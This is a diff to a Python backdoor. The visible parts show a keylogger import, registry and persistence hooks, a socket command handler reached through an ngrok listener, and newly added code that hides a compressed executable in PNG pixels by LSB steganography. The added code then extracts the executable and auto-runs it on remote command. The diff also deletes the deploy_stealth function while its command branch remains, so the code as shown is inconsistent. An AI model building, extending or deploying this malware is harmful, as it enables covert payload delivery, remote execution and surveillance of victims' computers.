@@ -15,7 +15,11 @@ import subprocess
 import base64
 import pynput
 import urllib.request
-
+import winreg as reg
+import zlib
+from PIL import Image
+import numpy as np
+import shutil
 from pynput import keyboard
 
 # If the free version of ngrok is used, the port will change each time ngrok is activated
@@ -310,7 +314,39 @@ def install_persistence(sock):
 # 3. Embed each bit into the LSB of RGB pixel values
 # 4. Save the modified image as PNG
 def hide_file_in_image(payload_path, carrier_path, output_path):
+  try:
+    with open(payload_path, "rb") as f:
+      original_data = f.read()
 
+      # Compress to reduce required image size
+      compressed = zlib.compress(original_data, level=9)
+      
+      # Add length header + data + end marker
+      to_hide = len(compressed).to_bytes(4, 'big') + compressed + b"###END###"
+      binary = ''.join(format(byte, '08b') for byte in to_hide)
+
+      img = Image.open(carrier_path)
+      data = np.array(img)
+
+      idx = 0
+      for i in range(data.shape[0]):
+        for j in range(data.shape[1]):
+          for k in range(3):  # R, G, B
+            if idx < len(binary):
+              data[i, j, k] = (data[i, j, k] & ~1) | int(binary[idx])
+              idx += 1
+            else:
+              break
+          if idx >= len(binary): break
+        if idx >= len(binary): break
+
+      Image.fromarray(data).save(output_path, format="PNG")
+      print(f"[+] Payload hidden in {output_path} ({len(compressed)/1024:.1f} KB compressed)")
+      return True
+
+  except Exception as e:
+    print(f"[-] Hide failed: {e}")
+    return False
 
 # Extracts a hidden payload from an image that was embedded using LSB steganography.
 # Preconditions: image_path points to a PNG containing LSB hidden data.
@@ -321,21 +357,50 @@ def hide_file_in_image(payload_path, carrier_path, output_path):
 # 3. Convert binary back to bytes, decompress, and save
 # 4. Auto-run if requested
 def extract_from_image(image_path, output_filename="extracted.exe", auto_run=False):
+  try:
+    img = Image.open(image_path)
+    data = np.array(img)
+
+    binary_data = ""
+    end_marker = ''.join(format(byte, '08b') for byte in b"###END###")
+
+    print(f"[*] Extracting hidden payload from {image_path}...")
+
+    for i in range(data.shape[0]):
+      for j in range(data.shape[1]):
+          for k in range(3):
+            binary_data += str(data[i, j, k] & 1)
+
+            if end_marker in binary_data[-len(end_marker):]:
+              all_bytes = bytes(int(binary_data[m:m+8], 2) 
+                for m in range(0, len(binary_data)-len(end_marker), 8))
+              
+              payload_size = int.from_bytes(all_bytes[:4], 'big')
+              compressed = all_bytes[4:4+payload_size]
+              payload = zlib.decompress(compressed)
+
+              with open(output_filename, "wb") as f:
+                f.write(payload)
+
+              print(f"[+] Successfully extracted {len(payload)/1024:.1f} KB")
+
+              if auto_run:
+                try:
+                  subprocess.Popen([output_filename], shell=True)
+                  print(f"[+] Auto-executed {output_filename}")
+                except Exception as e:
+                  print(f"[!] Auto-run failed: {e}")
+              return output_filename
+
+    print("[-] End marker not found - extraction failed")
+    return None
+
+  except Exception as e:
+    print(f"[-] Extraction error: {e}")
+    return None
 
 
 
-
-# Deploys the backdoor in a stealthy manner by copying itself to a new location with a new name and optionally hiding it within a carrier image.
-# Preconditions: new_name, new_path, and carrier_img are provided, and sock is a connected socket.
-# Postconditions: The backdoor is copied to the new location, optionally hidden in a carrier image, and a success or error message is sent back to the listener.
-# Pseudocode:
-# 1. Determine the source path of the current executable
-# 2. Construct the destination path using new_path and new_name
-# 3. Copy the backdoor to the new location
-# 4. If carrier_img is provided, attempt to hide the backdoor within the image
-# 5. Send success or error message back to the listener
-def deploy_stealth(new_name, new_path, carrier_img, sock):
-  
 
 ###
 ### Command Handler
@@ -395,6 +460,51 @@ def command_handler(sock):
       # Persistence command
       elif cmd.startswith("PERSIST"):
         install_persistence(sock)
+
+      
+      # Stealth deployment command
+      elif cmd.startswith("HIDE_STEG"):
+        try:
+          parts = cmd.split(maxsplit=3)
+          if len(parts) < 4:
+            sock.send(b"STEG_ERR|Usage: HIDE_STEG <payload.exe> <carrier.png> <output.png>")
+            return
+                
+          payload_file = parts[1]
+          carrier_img = parts[2]
+          output_img = parts[3]
+          
+          if hide_file_in_image(payload_file, carrier_img, output_img):
+            sock.send(f"STEG_OK|Payload successfully hidden in {output_img}".encode("utf-8"))
+          else:
+            sock.send(b"STEG_ERR|Failed to hide payload")
+                
+        except Exception as e:
+          sock.send(f"STEG_ERR|HIDE_STEG error: {str(e)}".encode("utf-8"))
+
+      # Extraction command
+      elif cmd.startswith("EXTRACT_STEG"):
+        try:
+          # Usage: EXTRACT_STEG <image_with_payload> [output_filename] [--run]
+          parts = cmd.split()
+          if len(parts) < 2:
+            sock.send(b"STEG_ERR|Usage: EXTRACT_STEG <hidden_image.png> [output.exe] [--run]")
+            return
+            
+          image_path = parts[1]
+          output_filename = parts[2] if len(parts) > 2 else "extracted.exe"
+          auto_run = "--run" in cmd.lower() or "-run" in cmd.lower()
+          
+          result = extract_from_image(image_path, output_filename, auto_run)
+          
+          if result:
+            sock.send(f"STEG_OK|Payload extracted successfully as {result}".encode("utf-8"))
+          else:
+            sock.send(b"STEG_ERR|Failed to extract payload")
+              
+        except Exception as e:
+          sock.send(f"STEG_ERR|EXTRACT_STEG error: {str(e)}".encode("utf-8"))
+
 
       # Stealth deployment command
       elif cmd.startswith("DEPLOY_STEALTH"):
